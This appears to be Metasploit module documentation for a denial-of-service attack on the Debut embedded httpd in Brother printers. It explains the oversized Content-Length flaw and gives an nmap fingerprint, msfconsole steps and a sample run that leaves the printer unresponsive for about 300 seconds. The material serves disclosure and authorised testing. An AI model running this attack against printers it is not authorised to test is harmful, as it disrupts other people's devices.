## Vulnerable Application

  Versions <= 1.20 of the Debut embedded httpd web server in use by Brother printers are vulnerable to denial of service 
  via a crafted HTTP request. This module will render the printer unresponsive from requests for ~300 seconds.
  This is thought to be caused by a single threaded web server which
  has a ~300 second timeout value.  By sending a request with a content-length larger than the actual data, the server waits
  to receive the rest of the data, which doesn't happen until the timeout occurs.  This DoS is for all services, not just http.

  This module was successfully tested against a Brother HL-L2380DW series.

  An nmap version scan of the vulnerable service should look similar to:
  `80/tcp open  http    Debut embedded httpd 1.20 (Brother/HP printer http admin)`.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/dos/http/brother_debut_dos```
  3. Do: ```set rhost [ip]```
  4. Do: ```run```
  5. You should see Success, and manual attempts to browse the web interface don't load.

## Scenarios

### Brother HL-L2380DW with Debut embedded 1.20

```
resource (brother.rc)> use auxiliary/dos/http/brother_debut_dos
resource (brother.rc)> set rhost 1.1.1.1
rhost => 1.1.1.1
resource (brother.rc)> exploit
[*] Sending malformed POST request at 2018-01-24 20:45:52.
[+] 1.1.1.1:80 - Connection Refused: Success! Server will recover about 2018-01-24 20:50:52
[*] Auxiliary module execution completed
```
